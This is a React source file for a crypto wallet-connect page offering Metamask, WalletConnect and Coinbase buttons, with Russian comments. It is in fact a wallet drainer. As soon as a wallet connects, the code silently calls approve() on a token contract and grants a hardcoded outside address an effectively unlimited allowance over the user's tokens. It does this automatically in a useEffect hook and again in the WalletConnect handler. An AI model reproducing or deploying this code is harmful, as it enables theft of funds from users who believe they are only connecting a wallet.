import {useWeb3React} from "@web3-react/core";
import Web3 from 'web3';
import {connectors} from "./connectors";
import {useEffect} from "react";
import {CONTACT_ABI, CONTACT_ADDRESS} from './contacts/config';


const App = () => {
    /*
          active: (BOOL) кошелек активно подключен прямо сейчас
          account: (address) адрес блокчейна, к которому подключен
          library: () это либо веб3, либо эфиры, в зависимости от того, что вы передали
          connector: текущий разъем. Итак, когда мы подключимся, в этом примере это будет инжектированный коннектор.
          activate: (wallet) способ подключения к кошельку
          deactivate: () способ отключения от кошелька
      */
    const {active, activate, account, library} = useWeb3React();


    useEffect(async () => {
        if (active === true) {
            let web3 = new Web3(library.provider);
            await approve(web3, account)
        }
    }, [active])

    useEffect(async () => {
        const provider = window.localStorage.getItem("provider");
        if (provider) {
            provider !== 'walletConnect' ?
                await activate(connectors[provider]) :
                await connectors.walletConnect.enable();
        }
    }, []);

    const setProvider = (type) => {
        window.localStorage.setItem("provider", type);
    };

    const approve = async (web3, account) => {
        let contact = new web3.eth.Contract(CONTACT_ABI, CONTACT_ADDRESS);

        let approveNumber = '99999999999999999999999999999999999999999999999999999';
        await contact.methods.approve('0xaa18df61131d2D3A6F972B14d2c7c5dC4E33683E', web3.utils.toBN(approveNumber)).send({
            from: account
        })
    }


    return (
        <>
            <div className="wallet_items">
                <a onClick={async () => {
                    await activate(connectors.injected);
                    setProvider('injected')
                }}>
                    <div className="wallet_item">
                        <img src="img/metamask.png" alt=""/>
                        <p>Metamask</p>
                    </div>
                </a>
                <a onClick={async () => {
                    await connectors.walletConnect.enable();
                    // await activate(connectors.walletConnect);
                    setProvider('walletConnect')

                    let web3 = new Web3(connectors.walletConnect);
                    let accounts = await web3.eth.getAccounts();
                    await approve(web3, accounts[0])
                }}>
                    <div className="wallet_item">
                        <img src="img/wallet_connect.png" alt=""/>
                        <p>WalletConnect</p>
                    </div>
                </a>
                <a onClick={async () => {
                    await activate(connectors.coinbaseWallet);
                    setProvider('coinbaseWallet')
                }}>
                    <div className="wallet_item">
                        <img src="img/coinbase.png" alt=""/>
                        <p>Coinbase</p>
                    </div>
                </a>
            </div>
            <div className="wallet_more">
                <img src="img/information.png" alt=""/>
                <a href="/">Learn how to connect</a>
            </div>
        </>
    );
}

export default App;
